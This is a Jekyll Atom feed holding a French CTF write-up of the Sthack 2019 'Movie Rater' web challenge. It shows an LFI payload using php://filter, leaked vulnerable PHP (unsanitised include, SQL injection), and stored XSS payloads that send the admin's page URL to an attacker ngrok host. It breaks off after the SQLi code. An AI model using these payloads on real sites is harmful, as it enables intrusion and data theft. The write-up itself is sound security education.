@@ -1,0 +1,367 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="fr"><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="fr" /><updated>2019-06-23T23:13:13+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Keclem blog</title><subtitle>Le blog d'un web développeur passionné de sécurité informatique</subtitle><author><name>Keclem blog</name></author><entry><title type="html">Write up - Movie Rater - Sthack 2019</title><link href="http://localhost:4000/write-up-sthack-2019/" rel="alternate" type="text/html" title="Write up - Movie Rater - Sthack 2019" /><published>2019-06-19T00:00:00+02:00</published><updated>2019-06-19T00:00:00+02:00</updated><id>http://localhost:4000/write-up-sthack-2019</id><content type="html" xml:base="http://localhost:4000/write-up-sthack-2019/">&lt;p&gt;Dans cet article, je vais vous présenter le write up d’une épreuve web du CTF de la Sthack 2019, un événement dédié à la sécurité informatique sur Bordeaux qui s’est déroulé le 14 Juin 2019.&lt;/p&gt;
+
+&lt;p&gt;Avant de commencer l’explication de ce challenge, je tiens à remercier la &lt;a href=&quot;https://twitter.com/TeamCryptis&quot; title=&quot;Twitter team cryptis&quot;&gt;@TeamCryptis&lt;/a&gt; de m’avoir accueillie au sein de leur équipe durant ce CTF et avec qui j’ai pu réaliser cette superbe première place.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sthack_2019/classement_sthack_2019_bis.jpg&quot; alt=&quot;Classement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On peut remercier &lt;a href=&quot;https://twitter.com/sth4ck&quot; title=&quot;Twitter de la sthack&quot;&gt;@sth4ck&lt;/a&gt; pour cette magnifique photo du classement 2019. ;)&lt;/p&gt;
+
+&lt;h1 id=&quot;etape-1--tour-dhorizon-du-challenger&quot;&gt;Etape 1 : Tour d’horizon du challenger&lt;/h1&gt;
+&lt;p&gt;Movie rater est un site où l’administrateur donne sa note sur les films de “hacker” préférés. Ce site est composé de trois pages accessibles pour le visiteur. Nous verrons par la suite qu’il existe d’autres pages utilisés par l’administrateur. Voici les trois pages:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Home : La page home qui n’a pas beaucoup d’interêt&lt;/li&gt;
+  &lt;li&gt;Movies : Cette page affiche toutes les affiches des films et leurs notes.
+&lt;img src=&quot;/assets/images/sthack_2019/movie_rater_page_movies.png&quot; alt=&quot;Page movies&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Rate : Cette page montre la photo de l’affiche et sa note ainsi que champs textbox pour donner son avis sur la note du film si le visiteur n’est pas d’accord avec la note donnée.
+&lt;img src=&quot;/assets/images/sthack_2019/change-rate.png&quot; alt=&quot;Page rate&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;etape-2--la-faille-lfi&quot;&gt;Etape 2 : La faille LFI&lt;/h1&gt;
+&lt;p&gt;Après ce tour d’horizon du site, on remarque que les pages Movies et Rate sont appelées via le paramètre GET “page=”. On ajoute le caractère apostrophe à la fin de la valeur du paramètre. Nous pouvons voir que la page affiche une erreur montrant qu’il y a une faille au niveau de l’inclusion php des pages, la première faille du site est donc un LFI (&lt;a href=&quot;https://fr.wikipedia.org/wiki/Remote_File_Inclusion&quot; title=&quot;Wikipédia Local File Inclusion&quot;&gt;Local File Inclusion&lt;/a&gt; )&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sthack_2019/faille_lfi.png&quot; alt=&quot;Page rate&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pour rappel une LFI permet notamment de lire le code php de la page à grace aux fonctions de filtrage de PHP. Pour récupérer le code des pages du site, nous allons utiliser le filtre base 64 de PHP comme ceci:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;://&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;convert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;movies&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Toutefois pour que cela fonctionne, il faut faire un urlencode de ce payload.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Ffilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Fconvert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Fresource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Dmovies&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;etape-3--lecture-des-fichiers-php&quot;&gt;Etape 3 : Lecture des fichiers php&lt;/h1&gt;
+&lt;h2 id=&quot;indexphp&quot;&gt;index.php&lt;/h2&gt;
+&lt;p&gt;Dans l’index.php, nous pouvons voir la faille LFI qui nous a permis de récupérer les fichiers php. On remarque qu’il n’y a aucun contrôle sur les entrées utilisateur dans le paramètre “page”.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'page'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'page'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;headphp&quot;&gt;head.php&lt;/h2&gt;
+&lt;p&gt;Petit détail amusant, un blocage de SQLmap apparaît dans le fichier head.php. Bah oui, on est à la Sthack, tu vas quand même pas t’amuser à utiliser un outil qui te permet de te l’a coulé douce la main dans le slip pendant le CTF !.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$user_agent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'HTTP_USER_AGENT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; 
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stripos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sqlmap'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hmm Hmm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;ratephp&quot;&gt;rate.php&lt;/h2&gt;
+&lt;p&gt;Ce fichier rate.php correspond à la page d’affichage et commentaire de la note du film. Dans celle-ci, nous pouvons voir plusieurs choses intéressantes.&lt;/p&gt;
+
+&lt;p&gt;Premièrement, il y a un contrôle des entrées utilisateur au niveau du paramètre “id” de l’URL. Seul des chiffres peuvent être entré dans ce paramètre. Donc pas une voie utilisable pour la réussite de ce challenge.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/^[0-9]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1,2&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;$/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	  &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;Do not hack me !&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Deuxièmement, on peut voir que le commentaire envoyé à l’admin passe par une page nommée : change-rate.php&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/change-rate.php?id=&amp;lt;?php echo $res['id']?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;textarea&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;comment&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/textarea&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;btn btn-block&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;change-ratephp&quot;&gt;change-rate.php&lt;/h2&gt;
+&lt;p&gt;Récupérons donc le code de cette page à l’aide de la faille LFI !&lt;/p&gt;
+
+&lt;p&gt;Dans le code cette page, nous voyons que le commentaire est stocké dans une table qui semble temporaire et qui va permettre à l’administrateur de site de lire ce commentaire.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bdd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;INSERT INTO comments_to_be_reviewed (movie_id,comment) VALUES (:id,:comment)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;movieId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;intval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;bindParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;':id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;//add filter to escape SQLi&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;bindParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;':comment'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'comment'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Your comment is under review by an administrator&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Cela peut signifier que l’administrateur va lire les commentaires envoyés et que par conséquent qu’il peut y avoir une faille XSS à l’ouverture ceux-ci.&lt;/p&gt;
+
+&lt;h1 id=&quot;etape-4--tester-de-la-faille-xss&quot;&gt;Etape 4 : Tester de la faille XSS&lt;/h1&gt;
+&lt;p&gt;Pour tester si la faille est présente, on va envoyer le payload suivant:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://XXXXXXXX.ngrok.io&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Ce payload va simplement rediriger l’administrateur vers une autre adresse. Ici j’utilise le logiciel ngrok qui permet de créer un tunnel de son localhost vers internet, c’est très pratique lorsque l’on veut partager un site en cours de développement en local via internet.&lt;/p&gt;
+
+&lt;p&gt;Ici l’utilisation de ngrok va permettre de voir les requêtes effectuées sur notre adresse à grace au panneau de suivi d’activité du logiciel.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sthack_2019/ngrock-test-lfi.png&quot; alt=&quot;viewing_panel&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous pouvoir voir que deux requêtes sont arrivées, cela signifie qu’il y a bien une faille XSS lorsque l’administrateur lit les commentaires.&lt;/p&gt;
+
+&lt;p&gt;Exploitons cette faille pour connaître le code de la partie accessible par l’admin. Pour cela, on va récupérer le nom du fichier php utilisé pour lire les commentaires. Comme ceux-ci:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://XXXXXXXX.ngrok.io?location=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;À la réception de la requête, on récupère /the-admin-secure-interface/review_comment.php.&lt;/p&gt;
+
+&lt;h1 id=&quot;etape-5--lecture-des-fichiers-accessibles-par-ladmin&quot;&gt;Etape 5 : Lecture des fichiers accessibles par l’admin&lt;/h1&gt;
+&lt;p&gt;La lecture du fichier review_comment.php ne montre rien d’intéressant pour la résolution du challenge mise à part la faille XSS.&lt;/p&gt;
+
+&lt;p&gt;En effet, la page récupère le commentaire et affiche le commentaire sans le contrôler ce qui a été écrit.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bdd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'select comment,movie_id from comments_to_be_reviewed LIMIT 1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	
+	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()){&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'comment'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;	
+	&lt;span class=&quot;nv&quot;&gt;$del&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bdd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;delete from comments_to_be_reviewed where movie_id='&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'movie_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;La page review_comment.php ne donnant rien, explorons la page /the-admin-secure-interface/index.php. Une fois le dump effectué on peut voir qu’il existe une page nommée /the-admin-secure-interface/stats.php.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-admin-secure-interfacestatsphp&quot;&gt;/the-admin-secure-interface/stats.php&lt;/h2&gt;
+&lt;p&gt;Le dump de cette page révèle que cette page affiche les statistiques d’un film. Mais ce qui saute aux yeux, c’est qu’il y a une faille SQLi lors de la récupération des informations.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
+	&lt;span class=&quot;nv&quot;&gt;$req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bdd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;select name,rating from movies where id='&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'stats_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
